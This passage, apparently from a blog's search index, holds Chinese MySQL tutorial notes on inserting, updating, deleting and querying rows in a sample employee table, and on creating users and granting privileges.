href=\"#添加数据（INSERT）\" class=\"headerlink\" title=\"添加数据（INSERT）\"></a>添加数据（INSERT）</h3><p>1). 给指定字段添加数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">INSERT INTO 表名 (字段名1, 字段名2, ...) VALUES (值1, 值2, ...);</span><br><span class=\"line\">insert into employee(id,workno,name,gender,age,idcard,entrydate)</span><br><span class=\"line\">values(1,&#x27;1&#x27;,&#x27;Itcast&#x27;,&#x27;男&#x27;,10,&#x27;123456789012345678&#x27;,&#x27;2000-01-01&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">insert into employee values(3,&#x27;3&#x27;,&#x27;韦一笑&#x27;,&#x27;男&#x27;,38,&#x27;123456789012345670&#x27;,&#x27;2005-01-</span><br><span class=\"line\">01&#x27;),(4,&#x27;4&#x27;,&#x27;赵敏&#x27;,&#x27;女&#x27;,18,&#x27;123456789012345670&#x27;,&#x27;2005-01-01&#x27;);</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"修改数据（UPDATE）\"><a href=\"#修改数据（UPDATE）\" class=\"headerlink\" title=\"修改数据（UPDATE）\"></a>修改数据（UPDATE）</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">UPDATE 表名 SET 字段名1 = 值1 , 字段名2 = 值2 , .... [ WHERE 条件 ] ;</span><br><span class=\"line\">update employee set name = &#x27;itheima&#x27; where id = 1;</span><br><span class=\"line\">update employee set name = &#x27;小昭&#x27; , gender = &#x27;女&#x27; where id = 1;</span><br><span class=\"line\">update employee set entrydate = &#x27;2008-01-01&#x27;;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"删除数据（DELETE）\"><a href=\"#删除数据（DELETE）\" class=\"headerlink\" title=\"删除数据（DELETE）\"></a>删除数据（DELETE）</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">DELETE FROM 表名 [ WHERE 条件 ] ;</span><br><span class=\"line\">delete from employee where gender = &#x27;女&#x27;;</span><br><span class=\"line\">delete from employee;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"DOL\"><a href=\"#DOL\" class=\"headerlink\" title=\"DOL\"></a>DOL</h2><p>DQL英文全称是Data Query Language(数据查询语言)，数据查询语言，用来查询数据库中表的记 录。</p>\n<p>数据准备:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">drop table if exists employee;</span><br><span class=\"line\">create table emp(</span><br><span class=\"line\">id int comment &#x27;编号&#x27;,</span><br><span class=\"line\">workno varchar(10) comment &#x27;工号&#x27;,</span><br><span class=\"line\">name varchar(10) comment &#x27;姓名&#x27;,</span><br><span class=\"line\">gender char(1) comment &#x27;性别&#x27;,</span><br><span class=\"line\">age tinyint unsigned comment &#x27;年龄&#x27;,</span><br><span class=\"line\">idcard char(18) comment &#x27;身份证号&#x27;,</span><br><span class=\"line\">workaddress varchar(50) comment &#x27;工作地址&#x27;,</span><br><span class=\"line\">entrydate date comment &#x27;入职时间&#x27;</span><br><span class=\"line\">)comment &#x27;员工表&#x27;;</span><br><span class=\"line\">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class=\"line\">VALUES (1, &#x27;00001&#x27;, &#x27;柳岩666&#x27;, &#x27;女&#x27;, 20, &#x27;123456789012345678&#x27;, &#x27;北京&#x27;, &#x27;2000-01-</span><br><span class=\"line\">01&#x27;);</span><br><span class=\"line\">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class=\"line\">VALUES (2, &#x27;00002&#x27;, &#x27;张无忌&#x27;, &#x27;男&#x27;, 18, &#x27;123456789012345670&#x27;, &#x27;北京&#x27;, &#x27;2005-09-</span><br><span class=\"line\">01&#x27;);</span><br><span class=\"line\">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class=\"line\">VALUES (3, &#x27;00003&#x27;, &#x27;韦一笑&#x27;, &#x27;男&#x27;, 38, &#x27;123456789712345670&#x27;, &#x27;上海&#x27;, &#x27;2005-08-</span><br><span class=\"line\">01&#x27;);</span><br><span class=\"line\">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class=\"line\">VALUES (4, &#x27;00004&#x27;, &#x27;赵敏&#x27;, &#x27;女&#x27;, 18, &#x27;123456757123845670&#x27;, &#x27;北京&#x27;, &#x27;2009-12-01&#x27;);</span><br><span class=\"line\">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class=\"line\">VALUES (5, &#x27;00005&#x27;, &#x27;小昭&#x27;, &#x27;女&#x27;, 16, &#x27;123456769012345678&#x27;, &#x27;上海&#x27;, &#x27;2007-07-01&#x27;);</span><br><span class=\"line\">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class=\"line\">VALUES (6, &#x27;00006&#x27;, &#x27;杨逍&#x27;, &#x27;男&#x27;, 28, &#x27;12345678931234567X&#x27;, &#x27;北京&#x27;, &#x27;2006-01-01&#x27;);</span><br><span class=\"line\">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class=\"line\">VALUES (7, &#x27;00007&#x27;, &#x27;范瑶&#x27;, &#x27;男&#x27;, 40, &#x27;123456789212345670&#x27;, &#x27;北京&#x27;, &#x27;2005-05-01&#x27;);</span><br><span class=\"line\">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class=\"line\">VALUES (8, &#x27;00008&#x27;, &#x27;黛绮丝&#x27;, &#x27;女&#x27;, 38, &#x27;123456157123645670&#x27;, &#x27;天津&#x27;, &#x27;2015-05-</span><br><span class=\"line\">01&#x27;);</span><br><span class=\"line\">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class=\"line\">VALUES (9, &#x27;00009&#x27;, &#x27;范凉凉&#x27;, &#x27;女&#x27;, 45, &#x27;123156789012345678&#x27;, &#x27;北京&#x27;, &#x27;2010-04-</span><br><span class=\"line\">01&#x27;);</span><br><span class=\"line\">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class=\"line\">VALUES (10, &#x27;00010&#x27;, &#x27;陈友谅&#x27;, &#x27;男&#x27;, 53, &#x27;123456789012345670&#x27;, &#x27;上海&#x27;, &#x27;2011-01-</span><br><span class=\"line\">01&#x27;);</span><br><span class=\"line\">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class=\"line\">VALUES (11, &#x27;00011&#x27;, &#x27;张士诚&#x27;, &#x27;男&#x27;, 55, &#x27;123567897123465670&#x27;, &#x27;江苏&#x27;, &#x27;2015-05-</span><br><span class=\"line\">01&#x27;);</span><br><span class=\"line\">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class=\"line\">VALUES (12, &#x27;00012&#x27;, &#x27;常遇春&#x27;, &#x27;男&#x27;, 32, &#x27;123446757152345670&#x27;, &#x27;北京&#x27;, &#x27;2004-02-</span><br><span class=\"line\">01&#x27;);</span><br><span class=\"line\">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class=\"line\">VALUES (13, &#x27;00013&#x27;, &#x27;张三丰&#x27;, &#x27;男&#x27;, 88, &#x27;123656789012345678&#x27;, &#x27;江苏&#x27;, &#x27;2020-11-</span><br><span class=\"line\">01&#x27;);</span><br><span class=\"line\">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class=\"line\">VALUES (14, &#x27;00014&#x27;, &#x27;灭绝&#x27;, &#x27;女&#x27;, 65, &#x27;123456719012345670&#x27;, &#x27;西安&#x27;, &#x27;2019-05-</span><br><span class=\"line\">01&#x27;);</span><br><span class=\"line\">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class=\"line\">VALUES (15, &#x27;00015&#x27;, &#x27;胡青牛&#x27;, &#x27;男&#x27;, 70, &#x27;12345674971234567X&#x27;, &#x27;西安&#x27;, &#x27;2018-04-</span><br><span class=\"line\">01&#x27;);</span><br><span class=\"line\">INSERT INTO emp (id, workno, name, gender, age, idcard, workaddress, entrydate)</span><br><span class=\"line\">VALUES (16, &#x27;00016&#x27;, &#x27;周芷若&#x27;, &#x27;女&#x27;, 18, null, &#x27;北京&#x27;, &#x27;2012-06-01&#x27;);</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"基本语法\"><a href=\"#基本语法\" class=\"headerlink\" title=\"基本语法\"></a>基本语法</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SELECT</span><br><span class=\"line\">字段列表</span><br><span class=\"line\">FROM</span><br><span class=\"line\">表名列表</span><br><span class=\"line\">WHERE</span><br><span class=\"line\">条件列表</span><br><span class=\"line\">GROUP BY</span><br><span class=\"line\">分组字段列表</span><br><span class=\"line\">HAVING</span><br><span class=\"line\">分组后条件列表</span><br><span class=\"line\">ORDER BY</span><br><span class=\"line\">排序字段列表</span><br><span class=\"line\">LIMIT</span><br><span class=\"line\">分页参数</span><br></pre></td></tr></table></figure>\n\n<p>基本查询（不带任何条件） 条件查询（WHERE） 聚合函数（count、max、min、avg、sum） 分组查询（group by） 排序查询（order by） 分页查询（limit）</p>\n<h3 id=\"基础查询\"><a href=\"#基础查询\" class=\"headerlink\" title=\"基础查询\"></a>基础查询</h3><p>1). 查询多个字段</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SELECT 字段1, 字段2, 字段3 ... FROM 表名 ;</span><br><span class=\"line\">SELECT * FROM 表名 ;</span><br></pre></td></tr></table></figure>\n\n<p>2). 字段设置别名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SELECT 字段1 [ AS 别名1 ] , 字段2 [ AS 别名2 ] ... FROM 表名;</span><br><span class=\"line\">SELECT 字段1 [ 别名1 ] , 字段2 [ 别名2 ] ... FROM 表名;</span><br></pre></td></tr></table></figure>\n\n<p>3). 去除重复记录</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SELECT DISTINCT 字段列表 FROM 表名;</span><br></pre></td></tr></table></figure>\n\n<p>eg:</p>\n<p>A. 查询指定字段 name, workno, age并返回</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select name,workno,age from emp;</span><br></pre></td></tr></table></figure>\n\n<p>B. 查询返回所有字段</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select id ,workno,name,gender,age,idcard,workaddress,entrydate from emp;</span><br><span class=\"line\">select * from emp;</span><br></pre></td></tr></table></figure>\n\n<p>C. 查询所有员工的工作地址,起别名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select workaddress as &#x27;工作地址&#x27; from emp;</span><br><span class=\"line\">-- as可以省略</span><br><span class=\"line\">select workaddress &#x27;工作地址&#x27; from emp;</span><br></pre></td></tr></table></figure>\n\n<p>D. 查询公司员工的上班地址有哪些(不要重复)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select distinct workaddress &#x27;工作地址&#x27; from emp;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"条件查询\"><a href=\"#条件查询\" class=\"headerlink\" title=\"条件查询\"></a>条件查询</h3><p>1). 语法</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SELECT 字段列表 FROM 表名 WHERE 条件列表 ;</span><br></pre></td></tr></table></figure>\n\n<p>2). 条件</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230306090357474.png\" alt=\"image-20230306090357474\"></p>\n<p>eg</p>\n<p>A. 查询年龄等于 88 的员工</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from emp where age = 88;</span><br></pre></td></tr></table></figure>\n\n<p>B. 查询年龄小于 20 的员工信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from emp where age &lt; 20;</span><br></pre></td></tr></table></figure>\n\n<p>C. 查询年龄小于等于 20 的员工信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from emp where age &lt;= 20;</span><br></pre></td></tr></table></figure>\n\n<p>D. 查询没有身份证号的员工信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from emp where idcard is null;</span><br></pre></td></tr></table></figure>\n\n<p>E.查询有身份证号的员工信</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from emp where idcard is not null;</span><br></pre></td></tr></table></figure>\n\n<p>F:查询年龄不等于 88 的员工信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from emp where age != 88;</span><br><span class=\"line\">select * from emp where age &lt;&gt; 88;</span><br></pre></td></tr></table></figure>\n\n<p>G. 查询年龄在15岁(包含) 到 20岁(包含)之间的员工信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from emp where age &gt;= 15 &amp;&amp; age &lt;= 20;</span><br><span class=\"line\">select * from emp where age &gt;= 15 and age &lt;= 20;</span><br><span class=\"line\">select * from emp where age between 15 and 20;</span><br></pre></td></tr></table></figure>\n\n<p>H. 查询性别为 女 且年龄小于 25岁的员工信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from emp where gender = &#x27;女&#x27; and age &lt; 25;</span><br></pre></td></tr></table></figure>\n\n<p>I. 查询年龄等于18 或 20 或 40 的员工信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from emp where age = 18 or age = 20 or age =40;</span><br><span class=\"line\">select * from emp where age in(18,20,40);</span><br></pre></td></tr></table></figure>\n\n<p>J. 查询姓名为两个字的员工信息 _ %</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from emp where name like &#x27;__&#x27;;</span><br></pre></td></tr></table></figure>\n\n<p>k. 查询身份证号最后一位是X的员工信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from emp where idcard like &#x27;%X&#x27;;</span><br><span class=\"line\">select * from emp where idcard like &#x27;_________________X&#x27;;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"聚合函数\"><a href=\"#聚合函数\" class=\"headerlink\" title=\"聚合函数\"></a>聚合函数</h3><p>1). 介绍 将一列数据作为一个整体，进行纵向计算 。</p>\n<p>2). 常见的聚合函数</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">函数</th>\n<th align=\"center\">功能</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">count</td>\n<td align=\"center\">统计数量</td>\n</tr>\n<tr>\n<td align=\"center\">max</td>\n<td align=\"center\">最大值</td>\n</tr>\n<tr>\n<td align=\"center\">min</td>\n<td align=\"center\">最小值</td>\n</tr>\n<tr>\n<td align=\"center\">avg</td>\n<td align=\"center\">平均值</td>\n</tr>\n<tr>\n<td align=\"center\">sum</td>\n<td align=\"center\">求和</td>\n</tr>\n</tbody></table>\n<p>A. 统计该企业员工数量</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select count(*) from emp; -- 统计的是总记录数</span><br><span class=\"line\">select count(idcard) from emp; -- 统计的是idcard字段不为null的记录数</span><br></pre></td></tr></table></figure>\n\n<p>B. 统计该企业员工的平均年龄</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select avg(age) from emp;</span><br></pre></td></tr></table></figure>\n\n<p>C. 统计该企业员工的最大年龄</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select max(age) from emp;</span><br></pre></td></tr></table></figure>\n\n<p>D. 统计该企业员工的最小年龄</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select min(age) from emp;</span><br></pre></td></tr></table></figure>\n\n<p>E. 统计西安地区员工的年龄之和</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select sum(age) from emp where workaddress = &#x27;西安&#x27;;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"分组查询\"><a href=\"#分组查询\" class=\"headerlink\" title=\"分组查询\"></a>分组查询</h3><p>1). 语法</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SELECT 字段列表 FROM 表名 [ WHERE 条件 ] GROUP BY 分组字段名 [ HAVING 分组</span><br><span class=\"line\">后过滤条件 ];</span><br></pre></td></tr></table></figure>\n\n<p>2). where与having区别</p>\n<p>执行时机不同：where是分组之前进行过滤，不满足where条件，不参与分组；而having是分组 之后对结果进行过滤。 </p>\n<p>判断条件不同：where不能对聚合函数进行判断，而having可以。</p>\n<p>A. 根据性别分组 , 统计男性员工 和 女性员工的数量</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select gender, count(*) from emp group by gender ;</span><br></pre></td></tr></table></figure>\n\n<p>B. 根据性别分组 , 统计男性员工 和 女性员工的平均年龄</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select gender, avg(age) from emp group by gender ;</span><br></pre></td></tr></table></figure>\n\n<p>C. 查询年龄小于45的员工 , 并根据工作地址分组 , 获取员工数量大于等于3的工作地址</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select workaddress, count(*) address_count from emp where age &lt; 45 group by</span><br><span class=\"line\">workaddress having address_count &gt;= 3;</span><br></pre></td></tr></table></figure>\n\n<p>D. 统计各个工作地址上班的男性及女性员工的数量</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select workaddress, gender, count(*) &#x27;数量&#x27; from emp group by gender , workaddress</span><br><span class=\"line\">;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"排序查询\"><a href=\"#排序查询\" class=\"headerlink\" title=\"排序查询\"></a>排序查询</h3><p>1). 语法</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SELECT 字段列表 FROM 表名 ORDER BY 字段1 排序方式1 , 字段2 排序方式2 ;</span><br></pre></td></tr></table></figure>\n\n<p>2). 排序方式</p>\n<p>ASC : 升序(默认值) DESC: 降序</p>\n<p>注意事项：</p>\n<p> •如果是升序, 可以不指定排序方式ASC ; </p>\n<p>• 如果是多字段排序，当第一个字段值相同时，才会根据第二个字段进行排序 ;</p>\n<p>A. 根据年龄对公司的员工进行升序排序</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from emp order by age asc;</span><br><span class=\"line\">select * from emp order by age;</span><br></pre></td></tr></table></figure>\n\n<p>B. 根据入职时间, 对员工进行降序排序</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from emp order by entrydate desc;</span><br></pre></td></tr></table></figure>\n\n<p>C. 根据年龄对公司的员工进行升序排序 , 年龄相同 , 再按照入职时间进行降序排序</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from emp order by age asc , entrydate desc;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"分页查询\"><a href=\"#分页查询\" class=\"headerlink\" title=\"分页查询\"></a>分页查询</h3><p>1). 语法</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SELECT 字段列表 FROM 表名 LIMIT 起始索引, 查询记录数 ;</span><br></pre></td></tr></table></figure>\n\n<p>A. 查询第1页员工数据, 每页展示10条记录</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from emp limit 0,10;</span><br><span class=\"line\">select * from emp limit 10;</span><br></pre></td></tr></table></figure>\n\n<p>B. 查询第2页员工数据, 每页展示10条记录 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from emp limit 10,10;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"案例-1\"><a href=\"#案例-1\" class=\"headerlink\" title=\"案例\"></a>案例</h3><p>1). 查询年龄为20,21,22,23岁的女员工信息。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from emp where gender = &#x27;女&#x27; and age in(20,21,22,23);</span><br></pre></td></tr></table></figure>\n\n<p>2). 查询性别为 男 ，并且年龄在 20-40 岁(含)以内的姓名为三个字的员工。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from emp where gender = &#x27;男&#x27; and ( age between 20 and 40 ) and name like</span><br><span class=\"line\">&#x27;___&#x27;;</span><br></pre></td></tr></table></figure>\n\n<p>3). 统计员工表中, 年龄小于60岁的 , 男性员工和女性员工的人数。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select gender, count(*) from emp where age &lt; 60 group by gender;</span><br></pre></td></tr></table></figure>\n\n<p>4). 查询所有年龄小于等于35岁员工的姓名和年龄，并对查询结果按年龄升序排序，如果年龄相同按 入职时间降序排序。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select name , age from emp where age &lt;= 35 order by age asc , entrydate desc;</span><br></pre></td></tr></table></figure>\n\n<p>5). 查询性别为男，且年龄在20-40 岁(含)以内的前5个员工信息，对查询的结果按年龄升序排序， 年龄相同按入职时间升序排序。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from emp where gender = &#x27;男&#x27; and age between 20 and 40 order by age asc ,</span><br><span class=\"line\">entrydate asc limit 5 ;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"执行顺序\"><a href=\"#执行顺序\" class=\"headerlink\" title=\"执行顺序\"></a>执行顺序</h3><p>DQL执行顺序</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230309085943559.png\" alt=\"image-20230309085943559\"></p>\n<p>验证：</p>\n<p>查询年龄大于15的员工姓名、年龄，并根据年龄进行升序排序。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select name , age from emp where age &gt; 15 order by age asc;</span><br></pre></td></tr></table></figure>\n\n<p>在查询时，我们给emp表起一个别名 e，然后在select 及 where中使用该别名。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select e.name , e.age from emp e where e.age &gt; 15 order by age asc;</span><br></pre></td></tr></table></figure>\n\n<p>可以正常的查询到结果,此时就说明： from 先执行, 然后 where 和 select 执行。</p>\n<p>那 where 和 select 到底哪个先执行呢? </p>\n<p>此时，此时我们可以给select后面的字段起别名，然后在 where 中使用这个别名，然后看看是否可 以执行成功。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select e.name ename , e.age eage from emp e where eage &gt; 15 order by age asc;</span><br></pre></td></tr></table></figure>\n\n<p>SQL报错了,可以得出结论: from 先执行，然后执行 where ， 再执行select 。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select e.name ename , e.age eage from emp e where e.age &gt; 15 order by eage asc;</span><br></pre></td></tr></table></figure>\n\n<p>成功,就验证了: order by 是在select 语句之后执行的。</p>\n<p><strong>综上所述，我们可以看到DQL语句的执行顺序为： from … where … group by … having … select … order by … limit …</strong></p>\n<h2 id=\"DCL\"><a href=\"#DCL\" class=\"headerlink\" title=\"DCL\"></a>DCL</h2><p>DCL英文全称是Data Control Language(数据控制语言)，用来管理数据库用户、控制数据库的访 问权限。</p>\n<h3 id=\"管理用户\"><a href=\"#管理用户\" class=\"headerlink\" title=\"管理用户\"></a>管理用户</h3><p>1). 查询用户</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from mysql.user;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230309090928741.png\" alt=\"image-20230309090928741\"></p>\n<p>其中 Host代表当前用户访问的主机, 如果为localhost, 仅代表只能够在当前本机访问，是不可以 远程访问的。 User代表的是访问该数据库的用户名。在MySQL中需要通过Host和User来唯一标识一 个用户。</p>\n<p>2). 创建用户</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">CREATE USER &#x27;用户名&#x27;@&#x27;主机名&#x27; IDENTIFIED BY &#x27;密码&#x27;;</span><br></pre></td></tr></table></figure>\n\n<p>3). 修改用户密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ALTER USER &#x27;用户名&#x27;@&#x27;主机名&#x27; IDENTIFIED WITH mysql_native_password BY &#x27;新密码&#x27; ;</span><br></pre></td></tr></table></figure>\n\n<p>4). 删除用户</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">DROP USER &#x27;用户名&#x27;@&#x27;主机名&#x27; ;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">注意事项:</span><br><span class=\"line\">• 在MySQL中需要通过用户名@主机名的方式，来唯一标识一个用户。</span><br><span class=\"line\">• 主机名可以使用 % 通配。</span><br><span class=\"line\">• 这类SQL开发人员操作的比较少，主要是DBA（ Database Administrator 数据库管理员）使用。</span><br></pre></td></tr></table></figure>\n\n<p>案例：</p>\n<p>A. 创建用户itcast, 只能够在当前主机localhost访问, 密码123456;</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">create user &#x27;itcast&#x27;@&#x27;localhost&#x27; identified by &#x27;123456&#x27;;</span><br></pre></td></tr></table></figure>\n\n<p>B. 创建用户heima, 可以在任意主机访问该数据库, 密码123456;</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">create user &#x27;heima&#x27;@&#x27;%&#x27; identified by &#x27;123456&#x27;;</span><br></pre></td></tr></table></figure>\n\n<p>C. 修改用户heima的访问密码为1234;</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">alter user &#x27;heima&#x27;@&#x27;%&#x27; identified with mysql_native_password by &#x27;1234&#x27;;</span><br></pre></td></tr></table></figure>\n\n<p>D. 删除 itcast@localhost 用户</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">drop user &#x27;itcast&#x27;@&#x27;localhost&#x27;;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"权限控制\"><a href=\"#权限控制\" class=\"headerlink\" title=\"权限控制\"></a>权限控制</h3><p>MySQL中定义了很多种权限,<a href=\"https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html\">MySQL :: MySQL 8.0 Reference Manual :: 6.2.2 Privileges Provided by MySQL</a></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230309092308658.png\" alt=\"image-20230309092308658\"></p>\n<p>1). 查询权限</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SHOW GRANTS FOR &#x27;用户名&#x27;@&#x27;主机名&#x27; ;</span><br></pre></td></tr></table></figure>\n\n<p>2). 授予权限</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">GRANT 权限列表 ON 数据库名.表名 TO &#x27;用户名&#x27;@&#x27;主机名&#x27;;</span><br></pre></td></tr></table></figure>\n\n<p>3). 撤销权限</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">REVOKE 权限列表 ON 数据库名.表名 FROM &#x27;用户名&#x27;@&#x27;主机名&#x27;;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">注意事项：</span><br><span class=\"line\">• 多个权限之间，使用逗号分隔</span><br><span class=\"line\">• 授权时， 数据库名和表名可以使用 * 进行通配，代表所有。</span><br></pre></td></tr></table></figure>\n\n<p>案例:</p>\n<p>A. 查询 ‘heima‘@’%’ 用户的权限</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">show grants for &#x27;heima&#x27;@&#x27;%&#x27;;</span><br></pre></td></tr></table></figure>\n\n<p>B. 授予 ‘heima‘@’%’ 用户itcast数据库所有表的所有操作权限</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">grant all on itcast.* to &#x27;heima&#x27;@&#x27;%&#x27;;</span><br></pre></td></tr></table></figure>\n\n<p>C. 撤销 ‘heima‘@’%’ 用户的itcast数据库的所有权限</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">revoke all on itcast.* from &#x27;heima&#x27;@&#x27;%&#x27;;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"函数\"><a href=\"#函数\" class=\"headerlink\" title=\"函数\"></a>函数</h1><p>函数 是指一段可以直接被另一段程序调用的程序或代码。</p>\n","tags":["mysql"]},{"title":"sagemathStudy","url":"/2023/03/09/sagemathStudy/","content":"","tags":["crypto 